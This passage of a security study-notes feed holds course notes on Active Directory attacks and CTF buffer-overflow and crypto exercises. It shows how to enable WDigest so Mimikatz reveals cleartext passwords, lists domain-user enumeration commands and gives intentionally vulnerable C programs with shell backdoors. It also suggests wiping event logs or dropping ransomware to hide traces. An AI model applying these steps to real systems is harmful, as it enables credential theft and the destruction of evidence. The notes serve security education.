Sysinternals - www.sysinternals.com
RW C:\Program Files
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab-time---本地提權">
 Lab Time - 本地提權
 &lt;a class="anchor" href="#lab-time---%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%ac%8a">#&lt;/a>
&lt;/h2>
&lt;h3 id="錯誤配置">
 ==錯誤配置==
 &lt;a class="anchor" href="#%e9%8c%af%e8%aa%a4%e9%85%8d%e7%bd%ae">#&lt;/a>
&lt;/h3>
&lt;p>找出low有存取權限的service檔案&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(顯示Mimikatz的明文)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/</guid><description>&lt;h1 id="ntustisc---ad-note---lab顯示mimikatz的明文">
 NTUSTISC - AD Note - Lab(顯示Mimikatz的明文)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e9%a1%af%e7%a4%bamimikatz%e7%9a%84%e6%98%8e%e6%96%87">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>之前在進行mimikatz的實作時，會看到很多wdigest是(null)的情況，主要原因是windows的設定的問題，所以只要把設定改回來，就可以正常顯示了，主要是windows不主動存取明文密碼&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://www.sohu.com/a/569244434_121124375">What is WDigest&lt;/a>
&lt;blockquote>
&lt;p>WDigest即摘要身份驗證，摘要身份驗證是一種質詢/響應協議，主要在WindowsServer2003中用於LDAP和基於Web的身份驗證。它利用超文本傳輸協議(HTTP)和簡單身份驗證安全層(SASL)交換進行身份驗證&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>&lt;a href="https://learn.microsoft.com/zh-tw/windows-server/identity/ad-ds/manage/understand-security-identifiers">什麼是安全性識別碼？&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>安全性識別碼可用來唯一識別安全性主體或安全性群組。 安全性主體可以代表可由作業系統驗證的任何實體，例如使用者帳戶、電腦帳戶，或在使用者或電腦帳戶的安全性內容中執行的執行緒或進程。&lt;/p>
&lt;p>每個帳戶或群組，或帳戶安全性內容中執行的每個進程，都有由授權單位發出的唯一 SID，例如 Windows 網域控制站。 SID 會儲存在安全性資料庫中。 系統會產生 SID，以識別建立帳戶或群組時的特定帳戶或群組。 當 SID 做為使用者或群組的唯一識別碼時，永遠不會再次用來識別其他使用者或群組。&lt;/p>&lt;/blockquote>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="顯示mimikatz的明文">
 ==顯示Mimikatz的明文==
 &lt;a class="anchor" href="#%e9%a1%af%e7%a4%bamimikatz%e7%9a%84%e6%98%8e%e6%96%87">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>只要打開regedit，在&lt;code>電腦\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&lt;/code>可能會看到&lt;code>UseLogonCredential&lt;/code>的名稱，只要把對應的數值改成1就可以了，當然如果沒看到的話也可以自己新增
&lt;img src="https://hackmd.io/_uploads/BkQAC8ERn.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>重開機
重開機前可以先把之前mimikatz的結果存起來，照樣之後可以對照著看&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Result
我挑了幾個SID一樣的結果來看
&lt;img src="https://hackmd.io/_uploads/HktIkvVA2.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/B1uqyDE02.png" alt="" />
左邊的是新增config之前，右邊的是重開機之後，可以看到原本(null)的地方大部分都有被顯示出來&lt;/p>
&lt;/li>
&lt;/ol></description></item><item><title>NTUSTISC - AD Note - 會後提及有用的工具</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/</guid><description>&lt;h1 id="ntustisc---ad-note---會後提及有用的工具">
 NTUSTISC - AD Note - 會後提及有用的工具
 &lt;a class="anchor" href="#ntustisc---ad-note---%e6%9c%83%e5%be%8c%e6%8f%90%e5%8f%8a%e6%9c%89%e7%94%a8%e7%9a%84%e5%b7%a5%e5%85%b7">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=JAnGtFoJlij-03nk&amp;amp;t=6024">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="edrendpoint-detection-and-response">
 &lt;a href="https://www.trendmicro.com/zh_tw/what-is/xdr/edr.html">EDR(Endpoint Detection and Response)&lt;/a>
 &lt;a class="anchor" href="#edrendpoint-detection-and-response">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>端點偵測及回應 (EDR) 結合了即時的持續監控、端點資料蒐集，以及進階交叉關聯，來偵測並回應主機和端點連線的可疑活動。這套方法可讓資安團隊快速發掘並交叉分析各種活動來產生高可信度的偵測事件，並提供手動和自動化回應選項。&lt;/p>
&lt;p>EDR 解決方案會記錄端點上發生的所有活動和事件。某些廠商或許還會將這項服務延伸至任何與您網路相連的工作負載。然後，這些記錄 (或事件記錄檔) 可用來發掘原本不會被發現的資安事件。即時的監控可以更快偵測威脅，不讓威脅有機會擴散至使用者端點之外。&lt;/p>&lt;/blockquote>
&lt;p>其實就是把我們感興趣的log抓出來而已&lt;/p>
&lt;h3 id="xdrextended-detection-and-response">
 &lt;a href="https://www.trendmicro.com/zh_tw/what-is/xdr.html">XDR(Extended detection and response)&lt;/a>
 &lt;a class="anchor" href="#xdrextended-detection-and-response">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>XDR (延伸式偵測及回應) 可蒐集並自動交叉關聯涵蓋多個防護層的資料，包括：電子郵件、端點、伺服器、雲端工作負載以及網路。如此可藉由資安分析來提供更快的威脅偵測，提升調查與回應時間。&lt;/p>
&lt;p>XDR 能打破資安產品之間的藩籬，採用一種全方位面面俱到的偵測及回應方法。XDR 可蒐集並透過交叉關聯涵蓋多個防護層的偵測事件與深入的活動資料，包括：電子郵件、端點、伺服器、雲端工作負載以及網路。如此豐富的資料若能透過自動化分析，就能更快偵測威脅，同時也讓資安分析師擁有適當的工具可完成更多任務，並透過調查來採取更迅速的行動。
&lt;img src="https://www.trendmicro.com/content/dam/trendmicro/global/en/what-is/xdr/XDR-new-market-iture.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;p>簡單來說EDR只能特定範圍或是單一產品上做到端點偵測，但XDR是能夠跨各個資安產品或是layer達到更全面的偵測以及比對事件的結果&lt;/p>
&lt;h3 id="mdrmanaged-detection-and-response">
 &lt;a href="https://ithelp.ithome.com.tw/articles/10307982">MDR(Managed Detection and Response)&lt;/a>
 &lt;a class="anchor" href="#mdrmanaged-detection-and-response">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>提供專業的資安人員來協助企業進行監控網路、分析事件、並且回應所遭遇的資安狀況如何做出對應的應變&lt;/p>
&lt;ul>
&lt;li>是一種服務&lt;/li>
&lt;li>藉由資安專家的服務，提供及時、有效的處理，以避免損失擴大&lt;/li>
&lt;li>將安全專業知識外包給專業的人員&lt;/li>
&lt;li>分析警示當中潛藏的危險徵兆&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;h3 id="如何滅證">
 如何滅證
 &lt;a class="anchor" href="#%e5%a6%82%e4%bd%95%e6%bb%85%e8%ad%89">#&lt;/a>
&lt;/h3>
&lt;p>只要讓windows保持預設值或是把event file砍掉就好了，因為windows10會記錄很多使用者的狀況，例如Quick Access的使用路徑或是使用者之前使用過的應用程式的縮圖等等，所以最暴力的方式是離開之前丟一個勒索病毒，它就會針對常見的file進行加密，這樣縱使不把東西刪掉，鑑識人員也不會知道裡面的內容是甚麼&lt;/p>
&lt;h3 id="如果正在使用win20082012">
 如果正在使用Win2008/2012
 &lt;a class="anchor" href="#%e5%a6%82%e6%9e%9c%e6%ad%a3%e5%9c%a8%e4%bd%bf%e7%94%a8win20082012">#&lt;/a>
&lt;/h3>
&lt;p>請趕快升級成Win2016，因為有很多攻擊手段是到win2016的就失效的，例如前面提到的wdigest在2008/2012是會開的，因為這樣在認證上才會成功&lt;/p>
&lt;h3 id="什麼是誘捕系統honey-pot">
 &lt;a href="https://www.ithome.com.tw/news/27824">什麼是誘捕系統（Honey Pot）？&lt;/a>
 &lt;a class="anchor" href="#%e4%bb%80%e9%ba%bc%e6%98%af%e8%aa%98%e6%8d%95%e7%b3%bb%e7%b5%b1honey-pot">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>就像是一罐用來吸引、捕捉昆蟲的蜂蜜，所謂的誘捕系統（Honey Pot）就是一個吸引攻擊者的目標，透過誘捕的手法，吸引駭客發動攻擊，以蒐集攻擊者的來源以及攻擊手法，現在除了應用在蒐集病毒特徵、攻擊手法，也用來蒐集假網站的IP，以及散布木馬或間諜程式等惡意來源名單，藉此觀察病蠕蟲、駭客入侵或惡意攻擊的來源、手段、管道及模式，由於會將所有攻擊動作與過程記錄下來，已經成為蒐集駭客資訊的重要方式之ㄧ。&lt;/p></description></item><item><title>NTUSTISC - AD Note - 環境建置 &amp; Background</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/</guid><description>&lt;h1 id="ntustisc---ad-note---環境建置--background">
 NTUSTISC - AD Note - 環境建置 &amp;amp; Background
 &lt;a class="anchor" href="#ntustisc---ad-note---%e7%92%b0%e5%a2%83%e5%bb%ba%e7%bd%ae--background">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>What is Directory Service?&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/p>
&lt;blockquote>
&lt;p>&lt;img src="https://i.imgur.com/QVJYCoG.jpg" alt="" />
Windows Server 系統使用的目錄服務 就是 Active Directory&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>What is Active Directory(AD)?&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;/p>
&lt;blockquote>
&lt;p>Windows的Windows Server中，負責架構中大型網路環境的集中式目錄管理服務(Directory Services)，他處理在組織中的網路物件，物件可以是&lt;font color="FF0000">使用者、群組、電腦、網域控制站、郵件、設定檔、組織單元、樹系&lt;/font>等等，只要是在AD結構定義檔(Schema)中定義的物件，就可以儲存在AD資料檔中，並利用AD Service Interface來存取&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>What is Domain Service?&lt;sup id="fnref1:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/p>
&lt;blockquote>
&lt;p>&lt;img src="https://i.imgur.com/k2ma2Nf.jpg" alt="" />
執行 AD DS 的伺服器稱為 domain controllers (DCs)&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>What is LDAP?&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup>
:::info&lt;/p>
&lt;blockquote>
&lt;p>輕量型目錄存取協定 (LDAP) 是用來從 Active Directory 讀取資料，及將資料寫入 Active Directory 的標準協定。某些應用程式使用 LDAP 新增、移除或搜尋 Active Directory 中的使用者和群組，或是傳輸登入資料來驗證 Active Directory 中的使用者。每個 LDAP 通訊都包括用戶端 (如應用程式) 和伺服器 (例如 Active Directory)。
:::&lt;/p></description></item><item><title>NTUSTISC - AD Note(Lab - 查詢網域使用者)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/</guid><description>&lt;h1 id="ntustisc---ad-notelab---查詢網域使用者">
 NTUSTISC - AD Note(Lab - 查詢網域使用者)
 &lt;a class="anchor" href="#ntustisc---ad-notelab---%e6%9f%a5%e8%a9%a2%e7%b6%b2%e5%9f%9f%e4%bd%bf%e7%94%a8%e8%80%85">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="lab-time---環境調查">
 Lab Time - 環境調查
 &lt;a class="anchor" href="#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5">#&lt;/a>
&lt;/h2>
&lt;h3 id="查詢網域使用者">
 ==查詢網域使用者==
 &lt;a class="anchor" href="#%e6%9f%a5%e8%a9%a2%e7%b6%b2%e5%9f%9f%e4%bd%bf%e7%94%a8%e8%80%85">#&lt;/a>
&lt;/h3>
&lt;p>常用的cheat sheet&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ net user /domain
$ net user &amp;lt;username&amp;gt; /domain
&lt;/code>&lt;/pre>&lt;p>:::spoiler Implementation&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ net user /domain
這項要求會在網域 kuma.org 下的網域控制站處理。


\\WIN-818G5VCOLJO.kuma.org 的使用者帳戶

-------------------------------------------------------------------------------
Administrator aleda.appolonia alikee.perri
aloise.elfrida amabelle.gayle andree.suki
angelique.hilda annice.eden anya.gypsy
audi.rosalind babb.joanne bambi.etta
bear berget.celka berna.raphaela
berny.kirby bill.marylee caitrin.latia
carey.kincaid carlye.chloette carmelle.libbi
casandra.cherrita casi.hyacinth cassondra.lothario
celeste.kelci charis.kory christi.nettle
coraline.mahalia corine.celesta cyndie.rhodie
daile.odetta darlleen.dorisa DefaultAccount
dollie.fayina dominica.carmon dorrie.paolina
eba.luca ella.randee erena.elinore
fara.iseabal fred.carmita gabriel.diannne
garnet.constancia gertrude.felecia gillian.marsiella
giulietta.moyra glenda.dorrie Guest
henrieta.sabine herminia.debby issy.eudora
jerrie.morganne jessa.corinna jori.floria
joyann.sibella kaja.brenda karoly.nadeen
katee.annemarie katharina.alyssa kiri.kath
kizzee.margaux krbtgt laurena.mirelle
lazaro.karoly lilas.lindy lily.kristofor
lina.allene linda.neda logan.janeen
lon.sonni lorne.celie lucilia.lelah
margo.sharl marlyn.loralee marney.ranee
martita.juanita marylynne.susannah maurizia.ines
mercy.edi moyra.fanechka nolana.rivy
ollie.dorita orelee.peri ortensia.fancy
philippa.eugenie philis.gilli pietra.fern
randene.lelah ranee.delinda reina.claire
renae.babette reyna.gwendolyn ricca.stefa
ronni.kristoforo rosetta.lotta ruthann.britta
ruthie.ebony seana.jeanette selestina.cassi
shantee.marylin sherri.jacquetta sile.rhiamon
sofie.darlleen star.rikki stormie.natala
命令已經成功完成。
&lt;/code>&lt;/pre>&lt;p>:::
說明：如果目前登入的帳號是在domain底下，就會出現類似如上的結果，會有一大堆使用者，但是目前的帳號沒有在該domain底下，會出現以下error:&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x00</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/</guid><description>&lt;h1 id="simple-buffer-overflow---0x00">
 Simple Buffer Overflow - 0x00
 &lt;a class="anchor" href="#simple-buffer-overflow---0x00">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 char buf[0x10];
 read(0, buf, 0x30); // It&amp;#39;ll read the value that you input and store in buf with length=0x30
 system(&amp;#34;pause&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that you can check &lt;a href="https://www.dotcpp.com/course/460">this page&lt;/a> to know more about &lt;code>read&lt;/code> function&lt;/li>
&lt;/ul>
&lt;h2 id="dynamic-analysis---x32dbg">
 Dynamic Analysis - &lt;code>x32dbg&lt;/code>
 &lt;a class="anchor" href="#dynamic-analysis---x32dbg">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>This is the original entry point of this program.
&lt;img src="https://imgur.com/DWOL9Hy.png" alt="" />&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x01</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/</guid><description>&lt;h1 id="simple-buffer-overflow---0x01">
 Simple Buffer Overflow - 0x01
 &lt;a class="anchor" href="#simple-buffer-overflow---0x01">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;p>Follow the concept of lecture &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/SJAt7Pd5s">0x00&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

void y0u_c4n7_533_m3()
{
 execve(&amp;#34;/bin/sh&amp;#34;, (char *[]){0}, (char *[]){0});
}

int main()
{
 char buf[16];
 puts(&amp;#34;This is your first bof challenge ;)&amp;#34;);
 fflush(stdout);
 read(0, buf, 0x30);
 system(&amp;#34;pause&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow.
We can check &lt;code>bof&lt;/code> in the main function that it read the string with length &lt;code>0x30&lt;/code> that bigger than &lt;code>buf&lt;/code> size.&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x02</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/</guid><description>&lt;h1 id="simple-buffer-overflow---0x02">
 Simple Buffer Overflow - 0x02
 &lt;a class="anchor" href="#simple-buffer-overflow---0x02">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="why-wed-like-to-create-shellcode">
 Why we&amp;rsquo;d like to create shellcode?
 &lt;a class="anchor" href="#why-wed-like-to-create-shellcode">#&lt;/a>
&lt;/h2>
&lt;p>In pwn problem, most of the program don&amp;rsquo;t have the secret function that we can take the shell. Thus, we can create a shellcode by ourselves and use &lt;code>bof&lt;/code> to overlap the original address by shellcode address. Then we can take the shell.&lt;/p>
&lt;h2 id="how-to-create-a-shellcode-in-bof">
 How to create a shellcode in BOF?
 &lt;a class="anchor" href="#how-to-create-a-shellcode-in-bof">#&lt;/a>
&lt;/h2>
&lt;p>In lecture &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs">0x01&lt;/a>, we can see sub-function that create a shell using command:&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x04</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/</guid><description>&lt;h1 id="simple-buffer-overflow---0x04">
 Simple Buffer Overflow - 0x04
 &lt;a class="anchor" href="#simple-buffer-overflow---0x04">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

char message[48];

int main()
{
 char name[16];
 printf(&amp;#34;Give me your message: &amp;#34;);
 fflush(stdout);
 read(0, message, 0x30);
 fflush(stdout);
 read(0, name, 0x30);
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>Actually, this is a variant of the &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs">lecture 0x01&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;font color="F0000">Note that&lt;/font>, the global variable has its own address, instead of local variable that push to stack that we don&amp;rsquo;t know at first.&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x05(Leak Canary)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/</guid><description>&lt;h1 id="simple-buffer-overflow---0x05leak-canary">
 Simple Buffer Overflow - 0x05(Leak Canary)
 &lt;a class="anchor" href="#simple-buffer-overflow---0x05leak-canary">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="canary-background">
 Canary Background
 &lt;a class="anchor" href="#canary-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://imgur.com/onxC8Aq.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

void backdoor()
{
 system(&amp;#34;/bin/sh&amp;#34;);
}

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char name[0x10];
 char phone[0x10];

 printf(&amp;#34;What&amp;#39;s your name: &amp;#34;);
 read(0, name, 0x100);
 printf(&amp;#34;Hello, %s !&amp;#34;, name);

 printf(&amp;#34;What&amp;#39;s your phone number: &amp;#34;);
 read(0, phone, 0x100);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use &lt;code>checksec&lt;/code> to observe the protection
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o bof2_leak_canary bof2_leak_canary.c -zexecstack -no-pie -z norelro
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/u5iueTC.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>First, we can use &lt;code>objdump -d -M Intel {filename}&lt;/code> to check the address of backdoor → &lt;code>0x4011b6&lt;/code>
&lt;img src="https://imgur.com/d30qIvL.png" alt="" />&lt;/p></description></item><item><title>Simple Crypto - 0x01(Modular Operation)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/</guid><description>&lt;h1 id="simple-crypto---0x01modular-operation">
 Simple Crypto - 0x01(Modular Operation)
 &lt;a class="anchor" href="#simple-crypto---0x01modular-operation">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-crypto-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-crypto-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10225768">『Day 23密碼卷宗現代篇非對稱章 - RSA&lt;/a>
&lt;a href="https://blog.csdn.net/lion19930924/article/details/61926019">模运算与逆元&lt;/a>
模運算基本特性:
$$
(a + b) % p = (a % p + b % p) % p \
(a - b) % p = (a % p - b % p) % p \
(a * b) % p = (a % p * b % p) % p \
(a ^ b) % p = ((a % p) ^ b ) % p
$$
模運算的结合律：
$$
((a + b) % p + c) % p= (a + (b + c) % p) % p \
((a * b) % p * c) % p = (a * (b * c) % p ) % p
$$
交換律：
$$
(a + b) % p = (b+a) % p \
(a * b) % p = (b * a) % p
$$
分配率：
$$
((a +b) % p * c) % p = ((a * c) % p + (b * c) % p) % p
$$&lt;/p></description></item><item><title>Simple Crypto - 0x02(Random Number Generator - LCG)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/</guid><description>&lt;h1 id="simple-crypto---0x02random-number-generator---lcg">
 Simple Crypto - 0x02(Random Number Generator - LCG)
 &lt;a class="anchor" href="#simple-crypto---0x02random-number-generator---lcg">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-crypto-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-crypto-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Linear Congruential Generator:
&lt;img src="https://i.imgur.com/pCTWEcO.png" alt="" />&lt;/p>
&lt;h2 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h2>
&lt;p>LCG Formula
$$
\begin{aligned}
